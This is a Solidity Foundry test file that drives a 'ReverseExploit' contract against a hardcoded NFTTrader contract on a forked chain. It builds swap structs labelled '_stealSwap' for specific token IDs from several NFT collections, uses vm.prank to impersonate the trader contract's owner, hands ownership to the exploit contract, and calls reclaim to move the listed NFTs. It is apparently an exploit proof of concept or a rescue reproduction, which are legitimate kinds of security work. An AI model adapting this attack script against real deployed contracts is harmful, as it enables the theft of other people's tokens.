// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {IERC721} from "forge-std/interfaces/IERC721.sol";
import {ReverseExploit, INFTTrader, swapStruct, swapIntent, swapStatus} from "../src/ReverseExploit.sol";

contract ReverseExploitTest is Test {
    ReverseExploit public _exploit;

    address _quit = 0xC218D847a18E521Ae08F49F7c43882b6d1963c60;

    swapStruct[] _nftsOne;
    swapStruct[] _nftsTwo;
    uint256[] private blc;

    uint256[] ocmTokenIds;
    uint256[] hashMaskTokenIds;
    uint256[] feudalzTokenIds;
    uint256[] tokenIds;

    swapStruct[] structs;

    uint256 _swapId;

    function setUp() public {
        vm.prank(_quit);
        _exploit = new ReverseExploit();

        _swapId = uint256(vm.load(0xC310e760778ECBca4C65B6C559874757A4c4Ece0, 0x0000000000000000000000000000000000000000000000000000000000000008));
    }

    function testExploit() public {
        ocmTokenIds.push(2817);
        ocmTokenIds.push(9408);
        ocmTokenIds.push(7331);
        ocmTokenIds.push(2401);
        ocmTokenIds.push(8552);

        tokenIds.push(0);
        for (uint256 i = 0; i < ocmTokenIds.length; i++) {
            tokenIds[0] = ocmTokenIds[i];
            swapStruct memory _stealSwap = swapStruct(
                0x960b7a6BCD451c9968473f7bbFd9Be826EFd549A,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        hashMaskTokenIds.push(12525);
        hashMaskTokenIds.push(2215);
        hashMaskTokenIds.push(13342);
        hashMaskTokenIds.push(5887);
        hashMaskTokenIds.push(14851);
        hashMaskTokenIds.push(6249);
        hashMaskTokenIds.push(77);
        hashMaskTokenIds.push(3346);
        hashMaskTokenIds.push(8167);
        hashMaskTokenIds.push(13927);
        hashMaskTokenIds.push(13280);

        for (uint256 i = 0; i < hashMaskTokenIds.length; i++) {
            tokenIds[0] = hashMaskTokenIds[i];
            swapStruct memory _stealSwap = swapStruct(
                0xC2C747E0F7004F9E8817Db2ca4997657a7746928,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        feudalzTokenIds.push(1699);

        for (uint256 i = 0; i < feudalzTokenIds.length; i++) {
            tokenIds[0] = feudalzTokenIds[i];
            swapStruct memory _stealSwap = swapStruct(
                0x3cA5b00Ade54365Fbd590D4BC397E044a13068E5,
                0x58874d2951524F7f851bbBE240f0C3cF0b992d79,
                tokenIds,
                blc,
                new bytes(0)
            );

            structs.push(_stealSwap);
        }

        vm.prank(INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).owner());

        INFTTrader(0xC310e760778ECBca4C65B6C559874757A4c4Ece0).transferOwnership(address(_exploit));

        vm.prank(_quit);
        _exploit.reclaim{value: 0.01 ether * structs.length}(structs, _swapId, 0x000000000000C35e4364DEFfA9059DbAdAeFd4F8);
    }
}
